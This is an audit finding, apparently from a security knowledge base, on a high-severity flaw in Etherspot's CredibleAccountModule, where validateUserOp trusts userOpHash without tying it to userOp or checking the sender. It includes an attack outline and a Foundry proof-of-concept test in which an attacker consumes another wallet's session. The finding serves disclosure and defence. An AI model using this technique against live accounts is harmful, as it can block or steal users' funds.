---
tags:
  - lang/solidity
  - sector/account
  - sector/stable
  - sector/staking
  - platform/shieldify
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[Etherspot]]"
auditors:
  - "[[Shieldify Security]]"
report: "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Etherspot-CredibleAccountModule-Security-Review.md"
genome:
  - "[[missing-modifier]]"
  - "[[direct-drain]]"
  - "[[account-signer]]"
  - "[[reward-accounting]]"
---
# [H-01] No Check for `userOp()` and `userOpHash()` Mismatch Nor the Validity of the Sender

- id: 61411
- impact: HIGH
- protocol: [[Etherspot]] Credibleaccountmodule
- reporter: Shieldify Security (Shieldify)
- source: https://github.com/shieldify-security/audits-portfolio-md/blob/main/Etherspot-CredibleAccountModule-Security-Review.md

## Summary


The `CredibleAccountModule` has a bug that allows malicious users to exploit the system by setting up modules and consuming other users' hash, preventing them from accessing their tokens. This is due to the fact that the `sessionKeySigner` is derived from `userOpHash` and there is no check to ensure that the `userOpHash` is the correct hash of the `userOp`. This allows attackers to provide different data in `userOp` and consume the signature in their favor. The impact of this bug is high as it can result in loss of funds for users. A proof of concept has been provided to demonstrate how the session can be consumed by an attacker. The recommendation is to ensure that `op.sender` is equal to `msg.sender` and to reconstruct the hash from the `userOp` itself to increase security. The team has fixed the issue.

## Details


## Severity

High Risk

## Description

The `CredibleAccountModule` does not hash the `userOp` and uses the hash to know the wallet that authorized the action. It uses `userOpHash` to derive the address that signed for that hash, and uses the data `userOp` to modify it.

File: [src/modules/validators/CredibleAccountModule.sol#L272-L273](https://github.com/etherspot/etherspot-modular-accounts/blob/d4774db9f544cc6f69000c55e97627f93fe7242b/src/modules/validators/CredibleAccountModule.sol#L272-L273)

```solidity
function validateUserOp(PackedUserOperation calldata userOp, bytes32 userOpHash) ... {
    if (userOp.signature.length < 65) return VALIDATION_FAILED;
    bytes memory sig = _digestSignature(userOp.signature);
>>  address sessionKeySigner = ECDSA.recover(ECDSA.toEthSignedMessageHash(userOpHash), sig);
>>  if (!validateSessionKeyParams(sessionKeySigner, userOp)) {
        return VALIDATION_FAILED;
    }
    // code
}
```

As we can see, the `sessionKeySigner` is derived from `userOpHash` and the actual input is `userOp`. There is no check that this `userOpHash` is the hashing of that `userOp`, and there is no check that the `userOp.sender` is the actual `msg.sender`. So anyone can do the following.

- Make an attacking contract and install the module
- Listen to the transactions made by the `sessionKeySigner`
- Use the valid hash and provide different data in `userOp` (like changing the recipient of tokens)
- Consume the signature in his favour and prevent consuming it again.
- The real Modular wallet will not be able to execute this tx as it will revert from the `EntryPoint` execution in the validating process.

## Impact

Malicious users can set up modules and consume other Valid ModularAccounts' hash. preventing them from consuming the sessionKey signature and releasing the tokens.

## Proof of Concept

1. Add the following function in `test/modules/CredibleAccountModule/concrete/CredibleAccountModule.t.sol`

```solidity
function test_validateUserOp_sheildify_sender_not_checked() public withRequiredModules {
    // Enable session key
    _enableSessionKey(address(scw));
    // Claim all tokens by solver
    bytes memory usdcData = _createTokenTransferExecution(solver.pub, amounts[0]);
    bytes memory daiData = _createTokenTransferExecution(solver.pub, amounts[1]);
    bytes memory usdtData = _createTokenTransferExecution(solver.pub, amounts[2]);
    Execution[] memory batch = new Execution[](3);
    batch[0] = Execution({target: address(usdc), value: 0, callData: usdcData});
    batch[1] = Execution({target: address(dai), value: 0, callData: daiData});
    batch[2] = Execution({target: address(usdt), value: 0, callData: usdtData});
    bytes memory opCalldata =
        abi.encodeCall(IERC7579Account.execute, (ModeLib.encodeSimpleBatch(), ExecutionLib.encodeBatch(batch)));
    (PackedUserOperation memory op, bytes32 hash) =
        _createUserOpWithSignature(sessionKey, address(scw), address(cam), opCalldata);

    /*
        the `sender` will be the SCW that is getting called by the EntryPoint.
        If an attacker called `CredibleAccountModule` directly putting `sender` as
        the real `scw` the `msg.sender` will be the attacker address
    */
    address attacker = makeAddr("attacker");
    vm.stopPrank();
    vm.prank(attacker);
    cam.validateUserOp(op, hash);

    // Session is Claimed before the real SCW execute it
    assertTrue(cam.isSessionClaimed(sessionKey.pub));

    // This function will revert
    vm.expectRevert();
    vm.startPrank(address(scw));
    _executeUserOp(op);
}
```

Then run the following command:

```bash
forge test --mt test_validateUserOp_sheildify_sender_not_checked
```

---

The PoC shows how the session is consumed by an attacker, preventing the Real SCW from consuming it.

## Recommendation

It should be ensured that `op.sender` equals `msg.sender`. And an optional thing to do to increase the security is to reconstruct the hash from the `userOp` itself. According to the `EIP-4337` hashing method. Instead of taking he hash and dealing with it as it is the correct hashing of `userOp`.

## Team Response

Fixed.
